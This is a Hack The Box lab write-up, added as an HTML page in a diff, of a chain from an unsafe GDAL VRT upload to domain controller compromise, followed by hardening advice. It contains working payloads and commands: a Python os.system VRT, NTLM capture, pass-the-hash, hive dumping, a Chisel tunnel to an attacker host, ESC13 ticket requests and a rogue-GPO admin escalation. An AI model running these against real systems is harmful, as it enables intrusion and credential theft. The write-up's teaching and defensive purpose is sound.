@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>RedEye — HTB Technical Write-Up (Lanky)</title>
+<meta name="description" content="RedEye walkthrough: GDAL VRT, NTLMv1, SSH pivoting, AD CS ESC13 and Group Policy abuse, with hardening and Splunk and Elastic detections.">
+<link rel="canonical" href="https://lankylukeaus.github.io/machines/redeye.html"><link rel="stylesheet" href="../assets/style.css?v=11">
+<style>.table-scroll{overflow-x:auto}pre{max-width:100%;overflow-x:auto}.writeup-toc{display:flex;flex-wrap:wrap;gap:.5rem 1rem}.writeup-toc a{font-size:.9rem}td code{overflow-wrap:anywhere}th,td{vertical-align:top}</style></head><body>
+<header class="nav"><div class="wrap"><a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a><a class="link" href="../index.html#lab">← all writeups</a></div></header>
+<article class="wrap"><a class="back" href="../index.html#lab">back to Hacking Lab</a><h1>RedEye</h1>
+<div class="subtitle">Hack The Box · Season 12 · completed 15 November 2026</div>
+<div class="machine-meta"><span class="pill newpill" data-added="2026-11-16">NEW</span><span class="pill season">Season 12</span><span class="pill diff-hard">Hard</span><span class="pill os-linux">Linux</span><span class="pill">Windows / Active Directory</span><span class="pill flagp">User</span><span class="pill flagp">Root</span><span class="pill rooted">● Completed</span></div>
+<div class="callout warn"><span class="tag">Technical spoilers</span>Walkthrough, hardening and detection content. Flags and reusable secrets are replaced with placeholders.</div>
+<details class="callout" open><summary>Jump to section</summary><nav class="writeup-toc" aria-label="Write-up sections"><a href="#executive-summary">Executive Summary</a>
+<a href="#scope-and-lab-topology">Scope and Lab Topology</a>
+<a href="#attack-path-at-a-glance">Attack Path at a Glance</a>
+<a href="#public-enumeration">1. Public Enumeration</a>
+<a href="#unsafe-geospatial-ingestion">2. Unsafe Geospatial Ingestion</a>
+<a href="#rocket-chat-trust-abuse">3. Rocket.Chat Trust Abuse</a>
+<a href="#netntlmv1-recovery">4. NetNTLMv1 Recovery</a>
+<a href="#wkstn01-compromise-and-the-user-flag">5. WKSTN01 Compromise and the User Flag</a>
+<a href="#internal-pivot">6. Internal Pivot</a>
+<a href="#active-directory-enumeration">7. Active Directory Enumeration</a>
+<a href="#ad-cs-esc13">8. AD CS ESC13</a>
+<a href="#gpo-link-abuse-and-dc01-compromise">9. GPO-Link Abuse and DC01 Compromise</a>
+<a href="#cleanup-performed">10. Cleanup Performed</a>
+<a href="#dead-ends-and-what-they-taught">11. Dead Ends and What They Taught</a>
+<a href="#how-i-would-harden-this-environment">12. How I Would Harden This Environment</a>
+<a href="#telemetry-prerequisites">13. Telemetry Prerequisites</a>
+<a href="#splunk-detections">14. Splunk Detections</a>
+<a href="#elastic-security-detections">15. Elastic Security Detections</a>
+<a href="#high-confidence-correlation-strategy">16. High-Confidence Correlation Strategy</a>
+<a href="#incident-response-actions-for-this-exact-chain">17. Incident-Response Actions for This Exact Chain</a>
+<a href="#mitre-att-ck-mapping">18. MITRE ATT&amp;CK Mapping</a>
+<a href="#conclusion">19. Conclusion</a>
+<a href="#references">References</a></nav></details>
+<p><strong>Edition:</strong> Public walkthrough; secrets redacted<br>
+<strong>Platform:</strong> Hack The Box<br>
+<strong>Machine:</strong> RedEye<br>
+<strong>Difficulty:</strong> Hard<br>
+<strong>Operating systems:</strong> Linux edge host and Windows Active Directory environment<br>
+<strong>Assessment date:</strong> 15 November 2026<br>
+<strong>Result:</strong> User and root flags obtained and accepted</p>
+
+<p>All flags, passwords, hashes, tokens, private keys, certificate material and machine-account secrets have been removed from this report. Placeholders such as &lt;TARGET_IP&gt;, &lt;ATTACKER_IP&gt;, &lt;PASSWORD&gt; and &lt;NT_HASH&gt; are intentional.</p>
+
+<h2 id="executive-summary">Executive Summary</h2>
+
+<p>RedEye exposed a small public attack surface, but the visible web application was only the entry point into a multi-stage compromise. The successful path crossed unsafe geospatial file processing, Rocket.Chat integration abuse, legacy NTLM authentication, Windows credential access, an SSH pivot, Active Directory Certificate Services and delegated Group Policy permissions.</p>
+
+<p>The initial weakness was the processing of attacker-controlled GDAL Virtual Raster files. A crafted VRTRawRasterBand referenced an arbitrary local file, providing a file-read primitive. A second VRT used an inline Python pixel function, which the server executed as the geospatial processing account. This converted a data-ingestion feature into operating-system command execution and exposed Rocket.Chat integration secrets.</p>
+
+<p>The compromised chat identity could communicate with an automated link-review workflow used by an IT operator. A believable link caused the victim workstation to authenticate to attacker-controlled infrastructure. A legacy Group Policy setting permitted NetNTLMv1, making the captured response recoverable. The resulting credential material provided local-administrator access to WKSTN01, where registry hives and an autologon password yielded both the user flag and a durable SSH login to the Linux edge host.</p>
+
+<p>The SSH session became the internal pivot. Active Directory enumeration identified an AD CS ESC13 condition: the GroupPolicy_Audit certificate template included an issuance-policy OID linked to the GPO-Auditors group. Authenticating with a certificate issued from that template caused the privileged group SID to be added to the Kerberos authorization data. That group had WriteGPLink over the IT organisational unit.</p>
+
+<p>The final escalation abused that delegated right. A controlled machine account, DNS record and service principal names supported a rogue Group Policy source. A malicious user scheduled task was linked to the IT OU and retrieved through attacker-controlled LDAP and SMB services. When policy refreshed during an Isabel RDP session on DC01, the task ran in the required context and added the compromised Gabby account to the domain controller's local Administrators group. Administrative SMB access then exposed the root flag.</p>
+
+<p>The compromise was not a single-vulnerability failure. It depended on several controls failing together:</p>
+
+<ol><li>Untrusted VRT content reached a privileged GDAL pipeline.</li>
+<li>Inline Python pixel functions and raw raster access were enabled.</li>
+<li>Application secrets were readable by the processing identity.</li>
+<li>A human chat identity and automated integration shared excessive trust.</li>
+<li>A legacy policy allowed NTLMv1.</li>
+<li>A domain identity had local-administrator access and a recoverable autologon secret.</li>
+<li>SSH password authentication accepted domain credentials on the edge host.</li>
+<li>AD CS issuance policy granted an authorisation group through ESC13.</li>
+<li>WriteGPLink was delegated over a sensitive OU.</li>
+<li>Domain systems could obtain policy material from unapproved LDAP and SMB servers.</li></ol>
+
+<h2 id="scope-and-lab-topology">Scope and Lab Topology</h2>
+
+<p>The target address changed after machine resets. This report therefore uses logical hostnames and placeholders rather than tying the method to one lease.</p>
+
+<div class="table-scroll"><table><thead><tr><th scope="col">System</th><th scope="col">Role</th><th scope="col">Address used during testing</th></tr></thead><tbody><tr><td>Public gateway</td><td>Linux edge host, nginx, SSH, GeoNetwork and Rocket.Chat proxying</td><td>&lt;TARGET_IP&gt;</td></tr>
+<tr><td>DC01</td><td>Windows Server 2022, domain controller, LDAP, SMB, Kerberos and AD CS</td><td>192.168.100.1</td></tr>
+<tr><td>WKSTN01</td><td>Windows 10 workstation</td><td>192.168.100.3</td></tr>
+<tr><td>Domain</td><td>Active Directory forest and DNS namespace</td><td>airways.htb</td></tr>
+<tr><td>Attacker</td><td>HTB VPN host</td><td>&lt;ATTACKER_IP&gt;</td></tr></tbody></table></div>
+
+<div class="callout"><span class="tag">Attack chain</span>GDAL VRT → Rocket.Chat → NTLMv1 → workstation administration → SSH pivot → ESC13 → WriteGPLink → rogue GPO → DC01.</div>
+
+<h2 id="attack-path-at-a-glance">Attack Path at a Glance</h2>
+
+<div class="table-scroll"><table><thead><tr><th scope="col">Phase</th><th scope="col">Technique</th><th scope="col">Outcome</th></tr></thead><tbody><tr><td>Discovery</td><td>Full TCP and service enumeration</td><td>SSH, GeoNetwork and Rocket.Chat identified</td></tr>
+<tr><td>Initial access</td><td>Malicious GDAL VRT</td><td>Arbitrary file read and command execution as gisops</td></tr>
+<tr><td>Credential access</td><td>Application secret exposure</td><td>Rocket.Chat integration identity compromised</td></tr>
+<tr><td>User interaction</td><td>Trusted chat message and automatic link review</td><td>Owen's workstation requested attacker content</td></tr>
+<tr><td>Credential access</td><td>Forced NTLM authentication</td><td>NetNTLMv1 response captured</td></tr>
+<tr><td>Credential recovery</td><td>Offline NTLMv1 response recovery</td><td>Owen's NT hash recovered</td></tr>
+<tr><td>Lateral movement</td><td>Pass-the-hash</td><td>Local-administrator access to WKSTN01</td></tr>
+<tr><td>Credential access</td><td>SAM, SYSTEM and SECURITY hive extraction</td><td>Local secrets and autologon password recovered</td></tr>
+<tr><td>Collection</td><td>Desktop flag access</td><td>Current user flag obtained</td></tr>
+<tr><td>Pivoting</td><td>SSH and Chisel reverse SOCKS</td><td>Internal AD services became reachable</td></tr>
+<tr><td>Privilege escalation</td><td>AD CS ESC13</td><td>Isabel obtained GPO-Auditors authorisation</td></tr>
+<tr><td>Domain policy abuse</td><td>WriteGPLink and rogue GPO</td><td>Gabby added to DC01 Administrators</td></tr>
+<tr><td>Objective</td><td>Administrative SMB access</td><td>Root flag obtained and submitted</td></tr></tbody></table></div>
+
+<h2 id="public-enumeration">1. Public Enumeration</h2>
+
+<p>I began with a full TCP scan because a web-only assumption would have missed the service that later became the most stable access path.</p>
+
+<pre data-lang="bash"><code>nmap -Pn -p- --min-rate 2000 -oA redeye-allports &lt;TARGET_IP&gt;
+nmap -Pn -sC -sV -p22,80,443,3000 -oA redeye-services &lt;TARGET_IP&gt;</code></pre>
+
+<p>The public host exposed:</p>
+
+<div class="table-scroll"><table><thead><tr><th scope="col">Port</th><th scope="col">Service</th><th scope="col">Observation</th></tr></thead><tbody><tr><td>22/tcp</td><td>OpenSSH 10.0p2 Debian</td><td>Password and public-key authentication enabled</td></tr>
+<tr><td>80/tcp</td><td>nginx</td><td>Redirected to geo.airways.htb</td></tr>
+<tr><td>443/tcp</td><td>HTTPS</td><td>Web and identity-related virtual hosts</td></tr>
+<tr><td>3000/tcp</td><td>HTTPS/nginx</td><td>Rocket.Chat</td></tr></tbody></table></div>
+
+<p>Virtual-host and redirect behaviour identified the following names:</p>
+
+<pre data-lang="text"><code>geo.airways.htb
+chat.airways.htb
+sts.airways.htb</code></pre>
+
+<p>The hosts were added locally for consistent name resolution:</p>
+
+<pre data-lang="text"><code>&lt;TARGET_IP&gt; geo.airways.htb chat.airways.htb sts.airways.htb</code></pre>
+
+<p>GeoNetwork was in the 4.4 branch and exposed geospatial import functionality. Rocket.Chat was available through port 3000. The sts host later proved to be the Active Directory Federation Services identity endpoint used by GeoNetwork's OIDC flow.</p>
+
+<p>The important operational lesson was to retain port 22 in the attack model. The web route produced the first execution primitive, but SSH became the durable entry point once a valid domain password was recovered.</p>
+
+<h2 id="unsafe-geospatial-ingestion">2. Unsafe Geospatial Ingestion</h2>
+
+<h3 id="1-arbitrary-file-read-with-vrtrawrasterband">2.1 Arbitrary file read with VRTRawRasterBand</h3>
+
+<p>GDAL's Virtual Raster format is XML that describes how GDAL should source and transform raster data. A VRT is therefore not a passive image. It can instruct GDAL to read other files and, where unsafe capabilities are enabled, execute Python pixel functions.</p>
+
+<p>The first proof of concept used VRTRawRasterBand and an absolute SourceFilename:</p>
+
+<pre data-lang="xml"><code>&lt;VRTDataset rasterXSize=&quot;512&quot; rasterYSize=&quot;1&quot;&gt;
+  &lt;SRS&gt;EPSG:4326&lt;/SRS&gt;
+  &lt;GeoTransform&gt;0,1,0,0,0,-1&lt;/GeoTransform&gt;
+  &lt;VRTRasterBand dataType=&quot;Byte&quot; band=&quot;1&quot; subClass=&quot;VRTRawRasterBand&quot;&gt;
+    &lt;SourceFilename relativeToVRT=&quot;0&quot;&gt;/etc/airport-gis/notify.env&lt;/SourceFilename&gt;
+    &lt;ImageOffset&gt;0&lt;/ImageOffset&gt;
+    &lt;PixelOffset&gt;1&lt;/PixelOffset&gt;
+    &lt;LineOffset&gt;512&lt;/LineOffset&gt;
+    &lt;ByteOrder&gt;LSB&lt;/ByteOrder&gt;
+  &lt;/VRTRasterBand&gt;
+&lt;/VRTDataset&gt;</code></pre>
+
+<p>When the ingestion service opened the VRT, GDAL read the referenced local file as if it were raster data. The returned or generated output confirmed access to a host-side environment file.</p>
+
+<p>This was the first decisive finding: the upload pipeline allowed an attacker to turn a filename inside untrusted XML into a local file read. The issue was broader than one file path. Any readable file within the service account's namespace was potentially exposed.</p>
+
+<h3 id="2-command-execution-with-an-inline-python-pixel-function">2.2 Command execution with an inline Python pixel function</h3>
+
+<p>A second VRT used VRTDerivedRasterBand with a Python pixel function. The test command wrote the current identity to a temporary file and copied an application environment file into a readable location:</p>
+
+<pre data-lang="xml"><code>&lt;VRTDataset rasterXSize=&quot;1&quot; rasterYSize=&quot;1&quot;&gt;
+  &lt;VRTRasterBand dataType=&quot;Byte&quot; band=&quot;1&quot; subClass=&quot;VRTDerivedRasterBand&quot;&gt;
+    &lt;PixelFunctionType&gt;redeye&lt;/PixelFunctionType&gt;
+    &lt;PixelFunctionLanguage&gt;Python&lt;/PixelFunctionLanguage&gt;
+    &lt;PixelFunctionCode&gt;&lt;![CDATA[
+import os
+def redeye(in_ar, out_ar, xoff, yoff, xsize, ysize,
+           raster_xsize, raster_ysize, buf_radius, gt, **kwargs):
+    os.system(
+        &quot;id &gt; /tmp/gisops-pixel-id; &quot;
+        &quot;cp /etc/rocketchat.env /tmp/rocketchat.env; &quot;
+        &quot;chmod 0644 /tmp/gisops-pixel-id /tmp/rocketchat.env&quot;
+    )
+    out_ar[:] = 1
+    return 0
+    ]]&gt;&lt;/PixelFunctionCode&gt;
+  &lt;/VRTRasterBand&gt;
+&lt;/VRTDataset&gt;</code></pre>
+
+<p>The ingestion worker executed the function as the gisops account. This confirmed operating-system command execution and exposed the Rocket.Chat integration configuration.</p>
+
+<p>For repeatable interaction, the same primitive created a UNIX-domain command socket under the geospatial spool directory. A small Python service accepted a command, executed it through the shell and returned stdout and stderr. That avoided repeatedly uploading one-command VRT files while the foothold was being investigated.</p>
+
+<h3 id="3-why-this-worked">2.3 Why this worked</h3>
+
+<p>The pipeline combined three unsafe conditions:</p>
+
+<ul><li>untrusted VRT content was accepted;</li>
+<li>VRTRawRasterBand could reference arbitrary paths; and</li>
+<li>inline Python pixel functions were executable.</li></ul>
+
+<p>GDAL's own security guidance warns that raw VRT bands can read arbitrary accessible files and that Python VRT pixel functions can execute hostile code. The relevant controls are GDAL_VRT_ENABLE_PYTHON, GDAL_VRT_ENABLE_RAWRASTERBAND and GDAL_VRT_RAWRASTERBAND_ALLOWED_SOURCE. See the <a href="https://gdal.org/en/stable/drivers/raster/vrt.html" target="_blank" rel="noopener">GDAL VRT documentation</a> and <a href="https://gdal.org/en/stable/user/security.html" target="_blank" rel="noopener">GDAL security guidance</a>.</p>
+
+<h2 id="rocket-chat-trust-abuse">3. Rocket.Chat Trust Abuse</h2>
+
+<p>The exposed environment data contained the credentials or token used by a Rocket.Chat integration. The integration operated as Gabby T, a geospatial platform engineer and member of the GeoNetwork administration group.</p>
+
+<p>The chat history provided important organisational context:</p>
+
+<ul><li>GeoNetwork was known to be outdated.</li>
+<li>A legacy change request had enabled older Windows authentication for a webhook workflow.</li>
+<li>Owen F was an IT operator.</li>
+<li>Links sent from Gabby's identity were automatically reviewed from Owen's workstation.</li>
+<li>Isabel's temporary credential had been discussed in chat.</li></ul>
+
+<p>Secrets and message content are not reproduced here. The key issue was trust concentration: a token recovered from the geospatial service represented a human-looking identity, and an automated workflow treated links from that identity as trusted.</p>
+
+<p>I sent Owen a plausible message framed as an AODB decommissioning report. The referenced web page was hosted on the attacker machine. The victim workflow fetched the page and then attempted to load an attacker-controlled authentication resource.</p>
+
+<p>The resulting sequence was:</p>
+
+<pre data-lang="text"><code>Compromised Gabby integration
+        |
+        v
+Rocket.Chat message to Owen
+        |
+        v
+Automated link review on WKSTN01
+        |
+        v
+HTTP/SMB authentication to attacker infrastructure
+        |
+        v
+NetNTLMv1 challenge-response captured</code></pre>
+
+<p>This aligns with MITRE ATT&amp;CK <a href="https://attack.mitre.org/techniques/T1187/" target="_blank" rel="noopener">T1187, Forced Authentication</a>.</p>
+
+<h2 id="netntlmv1-recovery">4. NetNTLMv1 Recovery</h2>
+
+<p>Responder was configured with a fixed challenge so the response could be processed by NTLMv1 recovery tooling:</p>
+
+<pre data-lang="bash"><code>sudo responder -I &lt;VPN_INTERFACE&gt; -v</code></pre>
+
+<p>The capture belonged to Owen F and used NTLMv1. The raw response, challenge and recovered credential material have been omitted.</p>
+
+<p>The response was normalised and processed with NTLMv1 DES-key recovery tooling. GPU acceleration reduced the search time, but the important finding was not the cracking implementation. The security boundary had already failed when a domain workstation was allowed to send a recoverable NTLMv1 response to an untrusted destination.</p>
+
+<p>After recovery, the NT hash was tested against WKSTN01 with pass-the-hash authentication:</p>
+
+<pre data-lang="bash"><code>nxc smb 192.168.100.3 -d AIRWAYS -u 'Owen.F' -H '&lt;NT_HASH&gt;'</code></pre>
+
+<p>The result showed local-administrator access.</p>
+
+<h2 id="wkstn01-compromise-and-the-user-flag">5. WKSTN01 Compromise and the User Flag</h2>
+
+<p>Administrative SMB access allowed the SAM, SYSTEM and SECURITY registry hives to be saved and extracted:</p>
+
+<pre data-lang="cmd"><code>reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
+reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y</code></pre>
+
+<p>Offline parsing recovered:</p>
+
+<ul><li>the local Administrator NT hash;</li>
+<li>cached domain logon material;</li>
+<li>the workstation machine-account secret; and</li>
+<li>a DefaultPassword value containing Owen's autologon password.</li></ul>
+
+<p>All values are redacted.</p>
+
+<p>The user flag was read from:</p>
+
+<pre data-lang="text"><code>C:\Users\Administrator\Desktop\user.txt</code></pre>
+
+<p>The flag is deliberately omitted. The accepted value changed when the HTB instance was restarted, so the current file was read again before final submission.</p>
+
+<p>The recovered Owen password also authenticated to SSH on the public Linux gateway:</p>
+
+<pre data-lang="bash"><code>ssh 'Owen.F@&lt;TARGET_IP&gt;'</code></pre>
+
+<p>This was the meaning of the foothold hint that there were more services than the web application. Port 22 was not a distraction; it became the reliable path into the environment.</p>
+
+<h2 id="internal-pivot">6. Internal Pivot</h2>
+
+<p>Chisel provided a reverse SOCKS tunnel from the gateway:</p>
+
+<p>On the attacker host:</p>
+
+<pre data-lang="bash"><code>./chisel server --reverse --port 9002</code></pre>
+
+<p>On the compromised gateway:</p>
+
+<pre data-lang="bash"><code>/tmp/chisel client &lt;ATTACKER_IP&gt;:9002 R:1083:socks</code></pre>
+
+<p>Proxychains was configured with:</p>
+
+<pre data-lang="text"><code>socks5 127.0.0.1 1083</code></pre>
+
+<p>Internal tools could then reach DC01 and WKSTN01:</p>
+
+<pre data-lang="bash"><code>proxychains4 nmap -sT -Pn -p53,88,135,389,445,464,636,3268,3389,5985 192.168.100.1
+proxychains4 nmap -sT -Pn -p135,139,445,3389,5985 192.168.100.3</code></pre>
+
+<p>After one machine reset, GeoNetwork's ADFS/OIDC authentication provided an alternative way to restore the Linux execution path. Gabby's domain credential authenticated to the GeoNetwork administration interface. A custom XSL formatter called Java Runtime execution to download and start the tunnel bootstrap script. This was operationally useful, but it did not change the underlying root cause: administrative application functionality could reach an unsafe execution primitive.</p>
+
+<h2 id="active-directory-enumeration">7. Active Directory Enumeration</h2>
+
+<p>LDAP, BloodHound and Certipy enumeration established the following relationships:</p>
+
+<ul><li>Domain: airways.htb</li>
+<li>Domain controller: DC01 at 192.168.100.1</li>
+<li>Workstation: WKSTN01 at 192.168.100.3</li>
+<li>Gabby was a member of GN_Admins.</li>
+<li>Isabel was associated with GP Management.</li>
+<li>The GroupPolicy_Audit certificate template contained a custom issuance-policy OID.</li>
+<li>That OID's msDS-OIDToGroupLink pointed to GPO-Auditors.</li>
+<li>GPO-Auditors had WriteGPLink over OU=IT,OU=Departments,DC=airways,DC=htb.</li></ul>
+
+<p>The effective privilege path was:</p>
+
+<pre data-lang="text"><code>Isabel can enrol in GroupPolicy_Audit
+        |
+        v
+Certificate includes an issuance-policy OID
+        |
+        v
+OID is linked to GPO-Auditors
+        |
+        v
+PKINIT TGT contains the GPO-Auditors SID
+        |
+        v
+WriteGPLink over the IT OU</code></pre>
+
+<h2 id="ad-cs-esc13">8. AD CS ESC13</h2>
+
+<p>ESC13 occurs when a certificate issuance policy object is linked to an Active Directory group through msDS-OIDToGroupLink. If a user obtains a certificate containing that policy and authenticates with it, the group may be represented in the resulting Kerberos authorisation data.</p>
+
+<p>The GroupPolicy_Audit template was therefore not merely an audit certificate. It acted as a path into a group that could modify which Group Policy Objects applied to the IT OU.</p>
+
+<p>Isabel's temporary credential was expired and required a password change. The password was changed through SAMR to a lab-controlled value, after which the template was enrolled. The resulting PFX, private key and password are not included.</p>
+
+<p>Linux Schannel LDAP authentication did not reproduce the required authorisation token. Native Windows PKINIT did. Rubeus was used on WKSTN01:</p>
+
+<pre data-lang="cmd"><code>Rubeus.exe asktgt /user:Isabel.O /domain:airways.htb /dc:192.168.100.1 ^
+  /certificate:&lt;CERTIFICATE_THUMBPRINT&gt; /nowrap ^
+  /outfile:C:\Windows\Temp\isabel.kirbi</code></pre>
+
+<p>The resulting Kerberos ticket was converted to ccache format for use through the SOCKS pivot. The ticket's authorisation data confirmed the GPO-Auditors group entitlement.</p>
+
+<p>The distinction mattered. Possessing a certificate was not enough; authentication had to use a path that caused the KDC to construct the expected privilege-bearing token.</p>
+
+<h2 id="gpo-link-abuse-and-dc01-compromise">9. GPO-Link Abuse and DC01 Compromise</h2>
+
+<h3 id="1-preparing-a-kerberos-aware-rogue-policy-source">9.1 Preparing a Kerberos-aware rogue policy source</h3>
+
+<p>A machine account named REDGPO2$ was created using the domain's default MachineAccountQuota. LDAP and HOST service principal names were added, and an AD-integrated DNS record mapped redgpo2.airways.htb to the attacker VPN address.</p>
+
+<p>No machine password, NT hash or AES key is included in this report.</p>
+
+<p>OUned was used to host:</p>
+
+<ul><li>a fake LDAP service on TCP 389 serving the Group Policy Container view;</li>
+<li>a fake SMB service on TCP 445 serving the Group Policy Template files; and</li>
+<li>a malicious user Group Policy Preference scheduled task.</li></ul>
+
+<p>The scheduled task's action was equivalent to:</p>
+
+<pre data-lang="cmd"><code>net localgroup Administrators AIRWAYS\Gabby.T /add</code></pre>
+
+<p>The policy was configured as a user policy because the available privileged user session was Isabel's RDP logon on DC01.</p>
+
+<p>An implementation detail was critical: DC01 requested an AES-encrypted LDAP service ticket for the machine account. Supplying only the machine account's NT/RC4 key did not work. The correct Kerberos salt was derived, the AES256 key was generated, and pre-authentication was verified before the fake service was restarted.</p>
+
+<h3 id="2-linking-the-malicious-policy">9.2 Linking the malicious policy</h3>
+
+<p>The ESC13-derived GPO-Auditors token was used to modify the gPLink attribute on the IT OU. This did not require modifying a legitimate production GPO. Instead, it caused the target OU to reference the attacker-controlled policy.</p>
+
+<p>This technique maps to MITRE ATT&amp;CK <a href="https://attack.mitre.org/techniques/T1484/001/" target="_blank" rel="noopener">T1484.001, Group Policy Modification</a>.</p>
+
+<h3 id="3-triggering-policy-processing">9.3 Triggering policy processing</h3>
+
+<p>Isabel logged on to DC01 over RDP. From SConfig, option 15 opened a command shell and policy processing was forced:</p>
+
+<pre data-lang="cmd"><code>gpupdate /force</code></pre>
+
+<p>DC01 contacted the rogue LDAP service for policy metadata and the rogue SMB service for the corresponding GPT. It retrieved:</p>
+
+<pre data-lang="text"><code>User\Preferences\ScheduledTasks\ScheduledTasks.xml</code></pre>
+
+<p>The scheduled task executed and added AIRWAYS\Gabby.T to DC01's local Administrators group.</p>
+
+<p>Administrative SMB access then succeeded:</p>
+
+<pre data-lang="bash"><code>nxc smb 192.168.100.1 -d AIRWAYS -u 'Gabby.T' -p '&lt;REDACTED&gt;' \
+  --exec-method smbexec -x 'type C:\Users\Administrator\Desktop\root.txt'</code></pre>
+
+<p>The root flag was read from:</p>
+
+<pre data-lang="text"><code>C:\Users\Administrator\Desktop\root.txt</code></pre>
+
+<p>The root flag is intentionally omitted. Both current-instance flags were accepted by Hack The Box.</p>
+
+<h2 id="cleanup-performed">10. Cleanup Performed</h2>
+
+<p>The following cleanup actions were completed:</p>
+
+<ul><li>Gabby was removed from DC01's local Administrators group.</li>
+<li>The malicious gPLink value on the IT OU was restored.</li>
+<li>OUned's LDAP and SMB services were stopped.</li>
+<li>The RDP session, Chisel tunnel and temporary file server were stopped.</li>
+<li>Temporary execution processes were terminated where access permitted.</li></ul>
+
+<p>The REDGPO2$ machine-account object could not be deleted with the available directory permission and remained until the disposable HTB lab was reset. This is recorded rather than claiming complete cleanup.</p>
+
+<h2 id="dead-ends-and-what-they-taught">11. Dead Ends and What They Taught</h2>
+
+<h3 id="1-aodb-ingestion-sql-injection">11.1 AODB ingestion SQL injection</h3>
+
+<p>The aodb-ingest.sh path and a possible SQL injection initially looked promising, especially after notify.env was identified. It was not the successful route. The reliable primitive came directly from unsafe VRT parsing: VRTRawRasterBand for file read and VRTDerivedRasterBand with inline Python for code execution.</p>
+
+<p>The lesson is to validate the exact data-processing boundary before assuming the backing database is the primary target. In this case the file parser was more privileged and more directly exploitable than the application query path.</p>
+
+<h3 id="2-treating-the-recovered-hash-as-the-final-goal">11.2 Treating the recovered hash as the final goal</h3>
+
+<p>Recovering Owen's NT hash was useful, but spending too long treating password cracking as the whole foothold would have obscured the larger trust chain. The hash was a bridge into WKSTN01. The valuable outcomes were the local-administrator session, autologon password, user flag and SSH access.</p>
+
+<h3 id="3-focusing-only-on-web-services">11.3 Focusing only on web services</h3>
+
+<p>The web application delivered code execution, but SSH supplied stability. The hint that there were more services than web was literal. A complete service inventory should remain in view throughout exploitation, not just during the first scan.</p>
+
+<h3 id="4-assuming-certificate-authentication-paths-were-equivalent">11.4 Assuming certificate authentication paths were equivalent</h3>
+
+<p>Schannel LDAP authentication and PKINIT did not produce identical effective authorisation. Native Windows PKINIT through Rubeus caused the KDC to issue a ticket with the group entitlement required for WriteGPLink. Testing the resulting token was more important than assuming the certificate's presence guaranteed the privilege.</p>
+
+<h3 id="5-using-only-the-machine-account-s-rc4-key">11.5 Using only the machine account's RC4 key</h3>
+
+<p>The rogue LDAP service initially failed because the DC requested AES. Deriving and validating the machine account's AES256 key resolved the Kerberos service-ticket issue. When a Kerberos-backed service fails, the negotiated encryption type, SPN, hostname, DNS and clock should all be checked before changing the overall attack path.</p>
+
+<h2 id="how-i-would-harden-this-environment">12. How I Would Harden This Environment</h2>
+
+<p>The most effective remediation is to break the attack chain at several independent points. The following order prioritises controls that remove whole classes of exposure.</p>
+
+<h3 id="priority-remediation-plan">Priority remediation plan</h3>
+
+<div class="table-scroll"><table><thead><tr><th scope="col">Priority</th><th scope="col">Control</th><th scope="col">Why it matters</th></tr></thead><tbody><tr><td>Critical</td><td>Disable untrusted VRT Python and raw-file access</td><td>Removes both the initial file-read and command-execution primitives</td></tr>
+<tr><td>Critical</td><td>Eliminate NTLMv1 and block outbound SMB/WebDAV</td><td>Prevents the captured challenge-response from being useful</td></tr>
+<tr><td>Critical</td><td>Remove the ESC13 issuance-policy-to-group link</td><td>Prevents certificates from granting GPO-Auditors membership</td></tr>
+<tr><td>Critical</td><td>Remove or tightly restrict WriteGPLink on sensitive OUs</td><td>Prevents delegated identities from redirecting policy</td></tr>
+<tr><td>High</td><td>Set MachineAccountQuota to zero or a justified value</td><td>Stops ordinary users from creating Kerberos service identities</td></tr>
+<tr><td>High</td><td>Restrict LDAP and SMB policy traffic to approved DCs</td><td>Prevents clients from retrieving GPO content from rogue systems</td></tr>
+<tr><td>High</td><td>Remove domain users from workstation local Administrators</td><td>Limits credential dumping and lateral movement</td></tr>
+<tr><td>High</td><td>Replace autologon passwords and deploy Windows LAPS</td><td>Removes reusable local secrets</td></tr>
+<tr><td>High</td><td>Disable SSH password authentication for domain identities</td><td>Prevents recovered passwords from becoming an edge-host shell</td></tr>
+<tr><td>Medium</td><td>Separate bot integrations from human identities</td><td>Makes chat-origin trust explicit and auditable</td></tr>
+<tr><td>Medium</td><td>Segment the DMZ, user network and Tier 0 services</td><td>Prevents an edge compromise from reaching AD directly</td></tr></tbody></table></div>
+
+<h3 id="1-secure-the-gdal-processing-pipeline">12.1 Secure the GDAL processing pipeline</h3>
+
+<p>For any service that processes untrusted geospatial data:</p>
+
+<ul><li>Set GDAL_VRT_ENABLE_PYTHON=NO.</li>
+<li>Disable raw VRT bands where possible with GDAL_VRT_ENABLE_RAWRASTERBAND=NO.</li>
+<li>If raw bands are required, set GDAL_VRT_RAWRASTERBAND_ALLOWED_SOURCE to a dedicated, non-sensitive input root.</li>
+<li>Reject VRTDerivedRasterBand, PixelFunctionLanguage=Python, inline PixelFunctionCode and absolute SourceFilename values at upload validation.</li>
+<li>Allowlist only the file formats and GDAL drivers the service genuinely requires.</li>
+<li>Run conversion in a short-lived container or sandbox under a dedicated, unprivileged identity.</li>
+<li>Mount only the submitted job directory; do not mount application configuration, SSH keys, tokens or host secrets.</li>
+<li>Use a read-only root filesystem, seccomp/AppArmor or SELinux, strict CPU and memory limits and no-new-privileges.</li>
+<li>Deny network egress from conversion workers unless a documented workflow requires it.</li>
+<li>Use private per-job spool directories with unpredictable identifiers and restrictive permissions.</li>
+<li>Do not pass user-controlled GDAL configuration flags or driver paths to command-line tools.</li>
+<li>Log the submitted format, detected driver, VRT elements, child processes, file opens and outbound connections.</li></ul>
+
+<p>These recommendations follow GDAL's <a href="https://gdal.org/en/stable/user/security.html" target="_blank" rel="noopener">security guidance</a>, which specifically warns about untrusted VRT raw bands and Python pixel functions.</p>
+
+<h3 id="2-protect-application-secrets-and-integration-identities">12.2 Protect application secrets and integration identities</h3>
+
+<ul><li>Move Rocket.Chat and service credentials out of flat environment files into a managed secret store.</li>
+<li>Use short-lived tokens where the product supports them.</li>
+<li>Give the ingestion account access only to job data, not chat integrations or unrelated application configuration.</li>
+<li>Use a dedicated bot identity that cannot be mistaken for a human engineer.</li>
+<li>Restrict the bot to required rooms and message actions.</li>
+<li>Rotate the integration token immediately after suspected exposure and revoke active sessions.</li>
+<li>Do not automatically open or render untrusted links merely because a trusted sender posted them.</li>
